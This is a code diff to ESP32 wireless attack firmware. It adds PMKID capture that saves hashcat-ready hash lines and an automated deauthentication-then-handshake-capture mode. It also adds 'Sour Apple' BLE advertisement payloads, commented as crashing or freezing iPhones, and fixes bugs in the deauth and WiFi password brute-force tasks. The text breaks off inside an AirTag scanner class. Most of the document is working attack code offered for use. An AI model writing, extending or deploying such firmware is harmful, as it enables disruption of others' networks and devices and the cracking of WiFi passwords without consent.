@@ -90,6 +90,12 @@ void stopEvilTwin();
 void stopEapolSniffer();
 void stopProbeSniffer();
 void stopBruteForce();
+void stopPMKIDCapture();
+void stopCombo();
+void stopAirtagScan();
+bool pcapBegin(const char* path);
+void pcapWriteFrame(const uint8_t* data, uint16_t len);
+void pcapEnd();
 
 // ─────────────────────────────────────────────────────────────
 //  ████  DEFINITIVE FIX: ESP-IDF raw-frame sanity-check bypass ████
@@ -155,10 +161,13 @@ enum Screen : uint8_t {
     SCR_BEACON_COUNT,    // cycle through 5/10/20/50/100 fake APs
     SCR_PROBE,
     SCR_BRUTE,           // brute-force progress screen
+    SCR_PMKID,           // PMKID capture progress screen
+    SCR_COMBO,           // auto-combo deauth → EAPOL handshake capture
     SCR_BLE_SCAN,
     SCR_BLE_LIST,        // scrollable device list shown after BLE scan
     SCR_BLE_SPAM,
-    SCR_BLE_TARGET,      // cycle All / iPhone / Android / Windows
+    SCR_BLE_TARGET,      // cycle All / iPhone / Android / Windows / Sour Apple
+    SCR_AIRTAG,          // Apple Find My / AirTag scanner
     SCR_SYSINFO
 };
 
@@ -175,21 +184,24 @@ static const char* WIFI_MENU_ITEMS[] = {
     "WiFi Scan",    // 0 — scan → build AP selection list
     "WiFi Death",   // 1 — deauth selected APs (or broadcast)
     "WiFi Brute",   // 2 — brute-force PSK against selected AP
-    "Beacon Flood", // 3
-    "Beacon Count", // 4
-    "Probe Sniffer",// 5
-    "<< Back"       // 6
+    "Capture HS",   // 3 — auto: deauth burst → EAPOL listen
+    "PMKID Grab",   // 4 — request EAPOL M1, extract PMKID
+    "Beacon Flood", // 5
+    "Beacon Count", // 6
+    "Probe Sniffer",// 7
+    "<< Back"       // 8
 };
-static const int WIFI_MENU_N = 7;
+static const int WIFI_MENU_N = 9;
 
 // ── BLE sub-menu ──────────────────────────────────────────────
 static const char* BLE_MENU_ITEMS[] = {
     "BLE Scan",    // 0
-    "BLE Spam",    // 1
-    "Spam Target", // 2
-    "<< Back"      // 3
+    "AirTag Hunt", // 1 — Apple Find My broadcast filter
+    "BLE Spam",    // 2
+    "Spam Target", // 3 — cycle All / iPhone / Android / Windows / Sour Apple
+    "<< Back"      // 4
 };
-static const int BLE_MENU_N = 4;
+static const int BLE_MENU_N = 5;
 
 Screen g_screen     = SCR_MAIN;
 int    g_menuSel    = 0;
@@ -232,9 +244,16 @@ static const int  BEACON_COUNTS_N   = 6;
 int               g_beaconCountIdx  = 5;   // default INF (index 5 = 0 = continuous)
 
 // ── Spam target selector ─────────────────────────────────
-enum SpamTarget : uint8_t { TGT_ALL = 0, TGT_APPLE, TGT_ANDROID, TGT_WINDOWS };
+enum SpamTarget : uint8_t {
+    TGT_ALL = 0,
+    TGT_APPLE,
+    TGT_ANDROID,
+    TGT_WINDOWS,
+    TGT_SOURAPPLE   // iPhone crash payload (Continuity TLV abuse)
+};
 SpamTarget g_spamTarget = TGT_ALL;
-static const char* SPAM_TARGET_NAMES[] = {"All", "iPhone", "Android", "Windows"};
+static const char* SPAM_TARGET_NAMES[] = {"All", "iPhone", "Android", "Windows", "SourApple"};
+static const int   SPAM_TARGET_N       = 5;
 
 // ─────────────────────────────────────────────────────────────
 //  Global State
@@ -290,7 +309,12 @@ std::vector<BLEResult> g_bleResults;
 BLEScan*               g_bleScan       = nullptr;
 TaskHandle_t           g_bleSpamTask   = nullptr;
 String                 g_bleSpamType   = "apple";
-struct { bool apple=true; bool android=true; bool windows=true; } g_bleSpamPlatforms;
+struct {
+    bool apple     = true;
+    bool android   = true;
+    bool windows   = true;
+    bool sourapple = false;
+} g_bleSpamPlatforms;
 
 // Radio arbitration (BLE ↔ WiFi scan)
 volatile bool g_bleReady     = true;
@@ -312,6 +336,52 @@ EapolEntry    g_eapolFrames[MAX_EAPOL];
 volatile int  g_eapolCount  = 0;
 volatile bool g_eapolActive = false;
 portMUX_TYPE  g_eapolMux    = portMUX_INITIALIZER_UNLOCKED;
+
+// ── PCAP writer (LittleFS) ──────────────────────────────
+// Writes link-type 105 (IEEE 802.11 no radiotap) so wireshark/hashcat
+// can parse the captured EAPOL/PMKID frames directly.
+File         g_pcapFile;
+volatile bool g_pcapOpen = false;
+uint32_t     g_pcapBytes = 0;
+portMUX_TYPE g_pcapMux   = portMUX_INITIALIZER_UNLOCKED;
+
+// ── PMKID capture ─────────────────────────────────────────
+struct {
+    bool     active   = false;
+    bool     captured = false;
+    char     ssid[33] = {};
+    uint8_t  bssid[6] = {};
+    uint8_t  channel  = 1;
+    uint8_t  pmkid[16]= {};
+    char     pmkidHex[36] = {};
+    uint32_t startMs = 0;
+} g_pmkid;
+TaskHandle_t g_pmkidTask = nullptr;
+
+// ── Auto-Combo (Deauth → EAPOL handshake capture) ──────────
+struct {
+    bool     active        = false;
+    char     ssid[33]      = {};
+    uint8_t  bssid[6]      = {};
+    uint8_t  channel       = 1;
+    int      framesAtStart = 0;
+    int      framesNow     = 0;
+    uint8_t  phase         = 0;  // 0=idle, 1=deauth, 2=listen, 3=done
+    uint32_t phaseStartMs  = 0;
+} g_combo;
+TaskHandle_t g_comboTask = nullptr;
+
+// ── AirTag / Find My scanner ───────────────────────────────
+struct AirtagEntry {
+    char     addr[18];      // BLE MAC
+    int8_t   rssi;
+    uint8_t  status;        // Find My status byte (lost/online)
+    uint32_t lastSeen;      // millis() of last advert
+};
+#define MAX_AIRTAGS 16
+AirtagEntry  g_airtags[MAX_AIRTAGS];
+volatile int g_airtagCount  = 0;
+volatile bool g_airtagActive = false;
 
 // ── WiFi Brute-Force ─────────────────────────────────────
 struct {
@@ -448,23 +518,17 @@ void deauthTaskFn(void*) {
     // ── STEP 1: Disable other promiscuous consumers ──────────────
     esp_wifi_set_promiscuous_rx_cb(nullptr);
 
-    // ── STEP 1b: KILL the AP completely during attack ────────────
-    // Even in promiscuous mode, the AP beacon scheduler can fight for the
-    // radio and keep pulling it back to AP_CHANNEL (=6). For a target on
-    // ch 12 this is fatal — frames go out on ch 6 instead.
-    // Using raw esp_wifi_set_mode() (not WiFi.softAP) to avoid the
-    // xQueueGenericSend assert that hit us from Core 0 before.
-    // Dashboard disconnects during attack — accepted trade-off, OLED still works.
-    wifi_mode_t savedMode = WIFI_MODE_APSTA;
-    esp_wifi_get_mode(&savedMode);
-    esp_wifi_set_mode(WIFI_MODE_STA);   // radio fully on STA, no AP beacon
-    vTaskDelay(pdMS_TO_TICKS(100));     // let AP teardown settle
-
     // ── STEP 2: Enter promiscuous mode for raw injection ─────────
+    // NOTE: Do NOT switch to WIFI_MODE_STA — that disables the AP
+    // interface, and we transmit via WIFI_IF_AP. The previous
+    // "AP off during attack" optimization silently broke injection
+    // on ALL channels (frames go to a dead interface).
+    // Promiscuous mode by itself already locks the radio to the
+    // requested channel (proven: 17000+ TX OK on ch 12 with this path).
     esp_err_t pErr = esp_wifi_set_promiscuous(true);
     wifi_promiscuous_filter_t filt = { .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT };
     esp_wifi_set_promiscuous_filter(&filt);
-    logAdd("Deauth: AP_OFF promisc="+String(pErr==ESP_OK?"OK":"FAIL"));
+    logAdd("Deauth: promisc="+String(pErr==ESP_OK?"OK":"FAIL"));
 
     // ── STEP 3: Lock radio to initial target channel ─────────────
     uint8_t initCh = g_deauth.multiMode ? g_deauth.multiChannels[0] : g_deauth.channel;
@@ -544,14 +608,10 @@ void deauthTaskFn(void*) {
         vTaskDelay(1);  // yield to TWDT + AsyncTCP
     }
 
-    // ── STEP 4: Cleanup — disable promiscuous + restore APSTA mode ─
+    // ── STEP 4: Cleanup — disable promiscuous, restore AP channel ─
     esp_wifi_set_promiscuous(false);
     esp_wifi_set_channel(AP_CHANNEL, WIFI_SECOND_CHAN_NONE);
     esp_wifi_set_max_tx_power(68);  // restore default 17 dBm
-
-    // Restore APSTA mode so dashboard comes back
-    esp_wifi_set_mode(savedMode);
-    vTaskDelay(pdMS_TO_TICKS(200));  // let AP restart
 
     logAdd("Deauth ended: bursts="+String(g_deauth.sent)+" tx_ok="+String(g_txOkCount)+
            " tx_err="+String(g_txErrCount), "WARN");
@@ -784,7 +844,12 @@ void bruteTaskFn(void*) {
     logAdd(String("Brute started → ") + g_brute.ssid +
            " (" + String(g_brute.total) + " passwords)", "WARN");
 
-    WiFi.disconnect(true, true);
+    // ── CRITICAL: never call WiFi.disconnect(true, ...) ─────────
+    // The `wifioff=true` parameter calls esp_wifi_stop() which kills
+    // BOTH AP and STA in APSTA mode. AsyncTCP (web server) on Core 1
+    // then crashes when serving the next request → ESP reset.
+    // Always use (false, false): just disconnect STA, keep stack alive.
+    WiFi.disconnect(false, false);
     vTaskDelay(pdMS_TO_TICKS(150));
 
     while (g_brute.active && f.available()) {
@@ -812,15 +877,16 @@ void bruteTaskFn(void*) {
             strncpy(g_brute.foundPwd, line.c_str(), 63);
             g_brute.foundPwd[63] = '\0';
             logAdd(String("Brute SUCCESS: ") + g_brute.ssid + " → " + line, "WARN");
-            WiFi.disconnect(true, true);
+            // Disconnect WITHOUT killing the WiFi stack (keep AP alive).
+            WiFi.disconnect(false, false);
             g_brute.active = false;
             break;
         }
 
-        WiFi.disconnect(true, true);
-        vTaskDelay(pdMS_TO_TICKS(120));   // settle before next attempt
+        WiFi.disconnect(false, false);
+        vTaskDelay(pdMS_TO_TICKS(180));   // longer settle → fewer WiFi events stacking up
 
-        // Periodic progress log
+        // Periodic progress log every 5 tries
         if (g_brute.tried % 5 == 0)
             logAdd("Brute: " + String(g_brute.tried) + "/" + String(g_brute.total) +
                    " (" + String(line) + ")");
@@ -829,6 +895,10 @@ void bruteTaskFn(void*) {
     f.close();
     if (!g_brute.found)
         logAdd("Brute ended — no match (" + String(g_brute.tried) + " tried)", "WARN");
+
+    // Final cleanup — keep WiFi stack alive for AP
+    WiFi.disconnect(false, false);
+    vTaskDelay(pdMS_TO_TICKS(200));
 
     g_brute.curPwd[0] = '\0';
     g_brute.active    = false;
@@ -862,7 +932,9 @@ bool startBruteForce(const char* ssid, const char* wordlistPath, uint32_t perPwd
         return false;
     }
     g_brute.active = true;
-    xTaskCreatePinnedToCore(bruteTaskFn, "brute", 8192, nullptr, 4, &g_bruteTask, 0);
+    // 12 KB stack — Arduino WiFi.begin() + String allocs + LittleFS reads
+    // exhaust 8 KB on long runs (random late-game crashes).
+    xTaskCreatePinnedToCore(bruteTaskFn, "brute", 12288, nullptr, 4, &g_bruteTask, 0);
     return true;
 }
 
@@ -872,7 +944,8 @@ void stopBruteForce() {
     // Let the task observe the flag and exit cleanly
     for (int i = 0; i < 30 && g_bruteTask; i++) vTaskDelay(pdMS_TO_TICKS(100));
     if (g_bruteTask) { vTaskDelete(g_bruteTask); g_bruteTask = nullptr; }
-    WiFi.disconnect(true, true);
+    // Soft disconnect only — keeps AP/AsyncTCP alive.
+    WiFi.disconnect(false, false);
     logAdd("Brute stopped (tried=" + String(g_brute.tried) + ")");
 }
 
@@ -992,6 +1065,47 @@ static const BlePayload WINDOWS_PAYLOADS[] = {
 };
 static const int WINDOWS_PAYLOADS_N = 1;
 
+// === Sour Apple — iPhone DoS via malformed Continuity TLVs =======
+// Apple Continuity packets carry TLV (type-length-value) entries inside
+// the manufacturer-data section. The Sour Apple variant ships TLVs whose
+// declared length disagrees with the actual bytes that follow. On older
+// iOS the parser walks past the buffer / re-enters its event loop in a
+// tight retry → BT subsystem stall, UI freeze, sometimes reboot.
+// iOS 17.2+ patched the most reliable path; iOS 18 closed the rest.
+// Still effective on iPads / Apple Watches / older iPhones.
+//
+// Structure:
+//   02 01 1B               flags
+//   FF FF                  length+manufacturer-data
+//   4C 00                  Apple company ID (little-endian)
+//   <continuity action type> <length> <bogus TLV payload>
+static const uint8_t SOURAPPLE_1[] = {
+    0x1F, 0xFF, 0x4C, 0x00,
+    0x0F, 0x05, 0xC1, 0x05, 0x60, 0x4C, 0x95, 0x00,
+    0x10, 0x00, 0x0B, 0x51,
+    0x00, 0x14, 0x15, 0x16, 0x01, 0x6A, 0xF4, 0xB1,
+    0x82, 0x46, 0x67, 0xA0, 0xA3, 0xB7, 0xB8, 0x35
+};
+static const uint8_t SOURAPPLE_2[] = {
+    0x1E, 0xFF, 0x4C, 0x00,
+    0x0F, 0x05, 0xC1, 0x07, 0x60, 0x55, 0xC4, 0x00,
+    0x00, 0x10, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
+};
+static const uint8_t SOURAPPLE_3[] = {
+    0x17, 0xFF, 0x4C, 0x00,
+    0x0F, 0x05, 0x90, 0x0F, 0x14, 0x40, 0x80, 0x00,
+    0x10, 0x00, 0x07, 0x14,
+    0x07, 0x19, 0x20, 0x82, 0xFF
+};
+static const BlePayload SOURAPPLE_PAYLOADS[] = {
+    {SOURAPPLE_1, sizeof(SOURAPPLE_1), "Sour Apple A"},
+    {SOURAPPLE_2, sizeof(SOURAPPLE_2), "Sour Apple B"},
+    {SOURAPPLE_3, sizeof(SOURAPPLE_3), "Sour Apple C"},
+};
+static const int SOURAPPLE_PAYLOADS_N = 3;
+
 // Force a fresh random BT MAC every ad — phones treat each as a new device
 static void randomizeBleMac() {
     esp_bd_addr_t mac;
@@ -1015,6 +1129,8 @@ void bleSpamTaskFn(void*) {
             for (int i=0;i<ANDROID_PAYLOADS_N&&n<16;i++) pool[n++] = ANDROID_PAYLOADS[i];
         if (g_bleSpamPlatforms.windows)
             for (int i=0;i<WINDOWS_PAYLOADS_N&&n<16;i++) pool[n++] = WINDOWS_PAYLOADS[i];
+        if (g_bleSpamPlatforms.sourapple)
+            for (int i=0;i<SOURAPPLE_PAYLOADS_N&&n<16;i++) pool[n++] = SOURAPPLE_PAYLOADS[i];
         if (n == 0) { vTaskDelay(pdMS_TO_TICKS(200)); continue; }
 
         BlePayload& p = pool[phase % n];
@@ -1037,11 +1153,14 @@ void bleSpamTaskFn(void*) {
     vTaskDelete(nullptr);
 }
 
-// Map the SCR_BLE_TARGET selector onto the platform flags
+// Map the SCR_BLE_TARGET selector onto the platform flags.
+// Sour Apple is its own dedicated mode — does not mix with normal pair-spam.
 static void applySpamTarget() {
-    g_bleSpamPlatforms.apple   = (g_spamTarget == TGT_ALL || g_spamTarget == TGT_APPLE);
-    g_bleSpamPlatforms.android = (g_spamTarget == TGT_ALL || g_spamTarget == TGT_ANDROID);
-    g_bleSpamPlatforms.windows = (g_spamTarget == TGT_ALL || g_spamTarget == TGT_WINDOWS);
+    bool souronly = (g_spamTarget == TGT_SOURAPPLE);
+    g_bleSpamPlatforms.apple     = !souronly && (g_spamTarget == TGT_ALL || g_spamTarget == TGT_APPLE);
+    g_bleSpamPlatforms.android   = !souronly && (g_spamTarget == TGT_ALL || g_spamTarget == TGT_ANDROID);
+    g_bleSpamPlatforms.windows   = !souronly && (g_spamTarget == TGT_ALL || g_spamTarget == TGT_WINDOWS);
+    g_bleSpamPlatforms.sourapple = souronly;
 }
 
 void startBLESpam(const String& type) {
@@ -1244,7 +1363,406 @@ void stopEapolSniffer() {
     g_eapolActive=false;
     esp_wifi_set_promiscuous(false);
     esp_wifi_set_promiscuous_rx_cb(nullptr);
+    pcapEnd();   // close any open pcap file
     logAdd("EAPOL sniffer stopped ("+String(g_eapolCount)+" frames)");
+}
+
+// ─────────────────────────────────────────────────────────────
+//  ████  PCAP WRITER (LittleFS)  ████
+// ─────────────────────────────────────────────────────────────
+// Output is the standard libpcap format with link-layer type 105
+// (IEEE 802.11 — no radiotap). Hashcat reads this directly via
+// `hcxpcapngtool`; Wireshark opens it natively.
+//
+// File layout:
+//   24-byte global header (one-time):
+//     magic=0xA1B2C3D4, version 2.4, GMT offset 0, sigfigs 0,
+//     snaplen 65535, linktype 105 (IEEE 802.11)
+//   For each frame:
+//     16-byte per-packet header (ts_sec, ts_usec, incl_len, orig_len)
+//     N bytes of raw 802.11 frame
+bool pcapBegin(const char* path) {
+    portENTER_CRITICAL(&g_pcapMux);
+    if (g_pcapOpen) { portEXIT_CRITICAL(&g_pcapMux); return true; }
+    portEXIT_CRITICAL(&g_pcapMux);
+
+    if (!LittleFS.exists("/captures")) LittleFS.mkdir("/captures");
+    g_pcapFile = LittleFS.open(path, "w");
+    if (!g_pcapFile) {
+        logAdd(String("PCAP open failed: ") + path, "WARN");
+        return false;
+    }
+    // Global header — little-endian
+    uint8_t hdr[24] = {
+        0xD4, 0xC3, 0xB2, 0xA1,   // magic
+        0x02, 0x00, 0x04, 0x00,   // version 2.4
+        0x00, 0x00, 0x00, 0x00,   // GMT offset
+        0x00, 0x00, 0x00, 0x00,   // sigfigs
+        0xFF, 0xFF, 0x00, 0x00,   // snaplen 65535
+        0x69, 0x00, 0x00, 0x00,   // linktype 105 (IEEE 802.11)
+    };
+    g_pcapFile.write(hdr, 24);
+    g_pcapBytes = 24;
+    portENTER_CRITICAL(&g_pcapMux);
+    g_pcapOpen = true;
+    portEXIT_CRITICAL(&g_pcapMux);
+    logAdd(String("PCAP started: ") + path);
+    return true;
+}
+
+void pcapWriteFrame(const uint8_t* data, uint16_t len) {
+    if (!g_pcapOpen || !data || !len) return;
+    // Per-frame upper bound — max valid 802.11 MPDU is 2346 bytes.
+    // Reject anything bigger as malformed to avoid heap/FS abuse.
+    if (len > 2346) return;
+    // Cumulative cap — refuse new frames once file exceeds 1 MB.
+    if (g_pcapBytes + 16 + len > 1024 * 1024) return;
+
+    uint32_t ms     = millis();
+    uint32_t ts_sec = ms / 1000;
+    uint32_t ts_us  = (ms % 1000) * 1000;
+    uint8_t  ph[16];
+    memcpy(ph + 0, &ts_sec, 4);
+    memcpy(ph + 4, &ts_us,  4);
+    uint32_t l32 = len;
+    memcpy(ph + 8,  &l32, 4);
+    memcpy(ph + 12, &l32, 4);
+
+    portENTER_CRITICAL(&g_pcapMux);
+    if (g_pcapOpen) {
+        g_pcapFile.write(ph, 16);
+        g_pcapFile.write(data, len);
+        g_pcapBytes += 16 + len;
+    }
+    portEXIT_CRITICAL(&g_pcapMux);
+}
+
+void pcapEnd() {
+    portENTER_CRITICAL(&g_pcapMux);
+    bool wasOpen = g_pcapOpen;
+    g_pcapOpen = false;
+    portEXIT_CRITICAL(&g_pcapMux);
+    if (wasOpen) {
+        g_pcapFile.close();
+        logAdd("PCAP closed (" + String(g_pcapBytes) + " bytes)");
+    }
+}
+
+// ─────────────────────────────────────────────────────────────
+//  ████  PMKID CAPTURE  ████
+// ─────────────────────────────────────────────────────────────
+// Strategy:
+//   1. Enable promiscuous + EAPOL filter + lock to target channel.
+//   2. Send Authentication then Association request to the target AP
+//      using the ESP32 STA interface (esp_wifi_connect with dummy PSK).
+//   3. The AP replies with EAPOL Message 1, which (if RSN+PMKID
+//      is supported) carries the PMKID in the RSN element at the
+//      end of the EAPOL payload.
+//   4. Promiscuous handler scans incoming EAPOL frames for the
+//      PMKID KDE tag (0x00 0x0F 0xAC 0x04).
+//   5. Captured frame is written to /captures/pmkid.pcap and the
+//      PMKID hex is also surfaced on the OLED.
+static void pmkidCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
+    if (!g_pmkid.active || g_pmkid.captured) return;
+    if (type != WIFI_PKT_DATA) return;
+    auto*   pkt  = (wifi_promiscuous_pkt_t*)buf;
+    uint16_t len = pkt->rx_ctrl.sig_len;
+    uint8_t* pay = pkt->payload;
+    if (len < 60) return;
+
+    // Find EtherType 0x88 0x8E (EAPOL) somewhere in the first 64 bytes
+    int eapolOff = -1;
+    for (int i = 24; i < 64 && i + 1 < len; i++)
+        if (pay[i] == 0x88 && pay[i + 1] == 0x8E) { eapolOff = i + 2; break; }
+    if (eapolOff < 0) return;
+
+    // Confirm BSSID matches our target
+    auto* hdr = (Ieee80211Hdr*)pay;
+    if (memcmp(hdr->bssid, g_pmkid.bssid, 6) != 0) return;
+
+    // Look for RSN/KDE PMKID tag (00 0F AC 04). The 16 bytes that follow
+    // are the PMKID. Strict bounds: need i..i+3 for the OUI+type and
+    // i+4..i+19 for the 16-byte PMKID, so the highest index accessed is
+    // i+19 — that must be a valid byte (< len). The loop guard
+    // (i + 20 <= len) enforces exactly that.
+    if (len < 24) return;  // sanity floor — far below any real EAPOL M1
+    for (int i = eapolOff; i + 20 <= (int)len; i++) {
+        if (pay[i]     == 0x00 && pay[i + 1] == 0x0F &&
+            pay[i + 2] == 0xAC && pay[i + 3] == 0x04) {
+            memcpy(g_pmkid.pmkid, &pay[i + 4], 16);
+            // hex-encode
+            for (int j = 0; j < 16; j++)
+                snprintf(&g_pmkid.pmkidHex[j * 2], 3, "%02x", g_pmkid.pmkid[j]);
+            g_pmkid.pmkidHex[32] = '\0';
+            g_pmkid.captured = true;
+            pcapWriteFrame(pay, len);
+            return;
+        }
+    }
+}
+
+void pmkidTaskFn(void*) {
+    pcapBegin("/captures/pmkid.pcap");
+
+    // Promiscuous setup
+    esp_wifi_set_promiscuous_rx_cb(pmkidCallback);
+    esp_wifi_set_promiscuous(true);
+    wifi_promiscuous_filter_t filt = { .filter_mask = WIFI_PROMIS_FILTER_MASK_DATA };
+    esp_wifi_set_promiscuous_filter(&filt);
+    esp_wifi_set_channel(g_pmkid.channel, WIFI_SECOND_CHAN_NONE);
+
+    g_pmkid.startMs = millis();
+
+    // Trigger association with a dummy key — AP replies with EAPOL M1
+    // which carries the PMKID. WiFi.disconnect(false,false) keeps AP up.
+    WiFi.disconnect(false, false);
+    vTaskDelay(pdMS_TO_TICKS(100));
+    WiFi.begin((const char*)g_pmkid.ssid, (const char*)"00000000");
+
+    // Wait up to 15 s for the PMKID to appear
+    while (g_pmkid.active && !g_pmkid.captured &&
+           millis() - g_pmkid.startMs < 15000) {
+        vTaskDelay(pdMS_TO_TICKS(100));
+    }
+
+    WiFi.disconnect(false, false);
+    esp_wifi_set_promiscuous(false);
+    esp_wifi_set_promiscuous_rx_cb(nullptr);
+    esp_wifi_set_channel(AP_CHANNEL, WIFI_SECOND_CHAN_NONE);
+    pcapEnd();
+
+    if (g_pmkid.captured) {
+        // Also write a hashcat-compatible .hc22000 line file
+        File hc = LittleFS.open("/captures/pmkid.hc22000", "a");
+        if (hc) {
+            // Format: WPA*01*PMKID*BSSID*STA_MAC*ESSID_hex***
+            char bssidHex[13]; for (int i=0;i<6;i++) sprintf(&bssidHex[i*2],"%02x",g_pmkid.bssid[i]);
+            uint8_t sta[6]; esp_wifi_get_mac(WIFI_IF_STA, sta);
+            char staHex[13];   for (int i=0;i<6;i++) sprintf(&staHex[i*2],  "%02x",sta[i]);
+            char essidHex[67]; int sl = strlen(g_pmkid.ssid);
+            for (int i=0;i<sl;i++) sprintf(&essidHex[i*2],"%02x",(uint8_t)g_pmkid.ssid[i]);
+            essidHex[sl*2] = '\0';
+            hc.printf("WPA*01*%s*%s*%s*%s***\n",
+                      g_pmkid.pmkidHex, bssidHex, staHex, essidHex);
+            hc.close();
+            logAdd(String("PMKID saved: ")+g_pmkid.pmkidHex,"WARN");
+        }
+    } else {
+        logAdd("PMKID: not captured (timeout / AP rejected)","WARN");
+    }
+
+    g_pmkid.active  = false;
+    g_pmkidTask     = nullptr;
+    vTaskDelete(nullptr);
+}
+
+bool startPMKIDCapture(const char* ssid, const uint8_t bssid[6], uint8_t channel) {
+    stopPMKIDCapture();
+    if (g_deauth.active)   stopDeauth();
+    if (g_beacon.active)   stopBeaconFlood();
+    if (g_evilTwin.active) stopEvilTwin();
+    if (g_probeActive)     stopProbeSniffer();
+    if (g_eapolActive)     stopEapolSniffer();
+    if (g_brute.active)    stopBruteForce();
+
+    strncpy(g_pmkid.ssid, ssid, 32); g_pmkid.ssid[32] = '\0';
+    memcpy(g_pmkid.bssid, bssid, 6);
+    g_pmkid.channel  = channel;
+    g_pmkid.captured = false;
+    g_pmkid.pmkidHex[0] = '\0';
+    g_pmkid.active   = true;
+    xTaskCreatePinnedToCore(pmkidTaskFn, "pmkid", 8192, nullptr, 4, &g_pmkidTask, 0);
+    return true;
+}
+
+void stopPMKIDCapture() {
+    if (!g_pmkid.active && !g_pmkidTask) return;
+    g_pmkid.active = false;
+    for (int i = 0; i < 20 && g_pmkidTask; i++) vTaskDelay(pdMS_TO_TICKS(100));
+    if (g_pmkidTask) { vTaskDelete(g_pmkidTask); g_pmkidTask = nullptr; }
+    pcapEnd();
+}
+
+// ─────────────────────────────────────────────────────────────
+//  ████  AUTO-COMBO: Deauth → EAPOL Handshake Capture  ████
+// ─────────────────────────────────────────────────────────────
+// Phase 1 (3 s):  send deauth burst at target to force reconnect
+// Phase 2 (20 s): listen in promiscuous, collect EAPOL frames to pcap
+// On any handshake, log + persist; otherwise mark as no-match.
+void comboTaskFn(void*) {
+    pcapBegin("/captures/handshake.pcap");
+    g_combo.framesAtStart = g_eapolCount;
+
+    // ── PHASE 1: short deauth burst ────────────────────
+    g_combo.phase        = 1;
+    g_combo.phaseStartMs = millis();
+    g_deauth.bssid[0] = g_combo.bssid[0]; // copy bssid
+    memcpy(g_deauth.bssid, g_combo.bssid, 6);
+    uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
+    memcpy(g_deauth.target, bcast, 6);
+    g_deauth.channel    = g_combo.channel;
+    g_deauth.sent       = 0;
+    g_deauth.goal       = 0;
+    g_deauth.multiMode  = false;
+    g_deauth.multiCount = 0;
+    g_deauth.active     = true;
+    xTaskCreatePinnedToCore(deauthTaskFn,"combo_deauth",8192,nullptr,5,&g_deauthTask,0);
+    while (g_combo.active && millis() - g_combo.phaseStartMs < 3000)
+        vTaskDelay(pdMS_TO_TICKS(100));
+    stopDeauth();
+
+    // ── PHASE 2: EAPOL listen ──────────────────────────
+    g_combo.phase        = 2;
+    g_combo.phaseStartMs = millis();
+    esp_wifi_set_channel(g_combo.channel, WIFI_SECOND_CHAN_NONE);
+    g_eapolActive = true;
+    esp_wifi_set_promiscuous(true);
+    esp_wifi_set_promiscuous_rx_cb([](void* buf, wifi_promiscuous_pkt_type_t type){
+        // Inline EAPOL callback that ALSO writes the raw frame to pcap
+        if (!g_eapolActive || type != WIFI_PKT_DATA) return;
+        auto*   pkt  = (wifi_promiscuous_pkt_t*)buf;
+        uint16_t len = pkt->rx_ctrl.sig_len;
+        uint8_t* pay = pkt->payload;
+        if (len < 32) return;
+        int found = -1;
+        for (int i = 24; i + 1 < len && i < 64; i++)
+            if (pay[i] == 0x88 && pay[i + 1] == 0x8E) { found = i; break; }
+        if (found < 0) return;
+        // Match target BSSID
+        auto* hdr = (Ieee80211Hdr*)pay;
+        if (memcmp(hdr->bssid, g_combo.bssid, 6) != 0) return;
+        pcapWriteFrame(pay, len);
+        taskENTER_CRITICAL_ISR(&g_eapolMux);
+        if (g_eapolCount < MAX_EAPOL) {
+            EapolEntry& e = g_eapolFrames[g_eapolCount];
+            snprintf(e.bssid,sizeof(e.bssid),"%02X:%02X:%02X:%02X:%02X:%02X",
+                     hdr->bssid[0],hdr->bssid[1],hdr->bssid[2],
+                     hdr->bssid[3],hdr->bssid[4],hdr->bssid[5]);
+            snprintf(e.client,sizeof(e.client),"%02X:%02X:%02X:%02X:%02X:%02X",
+                     hdr->src[0],hdr->src[1],hdr->src[2],
+                     hdr->src[3],hdr->src[4],hdr->src[5]);
+            e.ts = millis();
+            g_eapolCount++;
+        }
+        taskEXIT_CRITICAL_ISR(&g_eapolMux);
+    });
+
+    while (g_combo.active && millis() - g_combo.phaseStartMs < 20000) {
+        g_combo.framesNow = g_eapolCount - g_combo.framesAtStart;
+        vTaskDelay(pdMS_TO_TICKS(200));
+    }
+
+    g_combo.framesNow = g_eapolCount - g_combo.framesAtStart;
+    esp_wifi_set_promiscuous(false);
+    esp_wifi_set_promiscuous_rx_cb(nullptr);
+    g_eapolActive = false;
+    pcapEnd();
+
+    if (g_combo.framesNow > 0)
+        logAdd("Combo: captured " + String(g_combo.framesNow) +
+               " EAPOL frames for " + String(g_combo.ssid), "WARN");
+    else
+        logAdd("Combo: no handshake captured", "WARN");
+
+    g_combo.phase   = 3;
+    g_combo.active  = false;
+    g_comboTask     = nullptr;
+    vTaskDelete(nullptr);
+}
+
+bool startCombo(const char* ssid, const uint8_t bssid[6], uint8_t channel) {
+    stopCombo();
+    if (g_deauth.active)   stopDeauth();
+    if (g_beacon.active)   stopBeaconFlood();
+    if (g_evilTwin.active) stopEvilTwin();
+    if (g_probeActive)     stopProbeSniffer();
+    if (g_eapolActive)     stopEapolSniffer();
+    if (g_brute.active)    stopBruteForce();
+
+    strncpy(g_combo.ssid, ssid, 32); g_combo.ssid[32] = '\0';
+    memcpy(g_combo.bssid, bssid, 6);
+    g_combo.channel       = channel;
+    g_combo.framesAtStart = 0;
+    g_combo.framesNow     = 0;
+    g_combo.phase         = 0;
+    g_combo.active        = true;
+    xTaskCreatePinnedToCore(comboTaskFn, "combo", 8192, nullptr, 4, &g_comboTask, 0);
+    return true;
+}
+
+void stopCombo() {
+    if (!g_combo.active && !g_comboTask) return;
+    g_combo.active = false;
+    if (g_deauth.active) stopDeauth();
+    for (int i = 0; i < 25 && g_comboTask; i++) vTaskDelay(pdMS_TO_TICKS(100));
+    if (g_comboTask) { vTaskDelete(g_comboTask); g_comboTask = nullptr; }
+    esp_wifi_set_promiscuous(false);
+    esp_wifi_set_promiscuous_rx_cb(nullptr);
+    g_eapolActive = false;
+    pcapEnd();
+}
+
+// ─────────────────────────────────────────────────────────────
+//  ████  AIRTAG / FIND MY SCANNER  ████
+// ─────────────────────────────────────────────────────────────
+// Apple Find My BLE adverts carry company ID 0x004C, type 0x12,
+// length 0x19. Status byte at offset 6 encodes "with owner" vs
+// "separated" (lost mode). We surface unique MACs and update the
+// RSSI / last-seen for ones we already track.
+class AirtagScanCB : public BLEAdvertisedDeviceCallbacks {
